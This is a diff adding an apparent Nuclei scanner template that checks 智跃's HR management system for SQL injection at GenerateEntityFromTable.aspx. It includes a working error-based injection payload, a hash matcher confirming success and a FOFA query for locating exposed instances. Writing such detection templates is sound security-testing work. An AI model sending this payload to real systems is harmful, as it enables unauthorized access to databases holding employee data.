@@ -1,0 +1,33 @@
+id: zhiyuerenliziyuan-GenerateEntityFromTable-sqli
+info:
+  name: 智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞
+  author: apple
+  severity: high
+  description: |
+        智跃人力资源管理系统是基于B/S网页端广域网平台，一套考勤系统即可对全国各地多个分公司进行统一管控，成本更低。信息共享更快。跨平台，跨电子设备。该系统存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。
+        fofa-query: body="ZY.LOGO.64.png"
+  reference:
+    - https://
+  
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: ASP.NET_SessionId=hhzwowbcpcdpr2h31ukr51hy
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '4122cb13c7a474c1976c9706ae36521d'
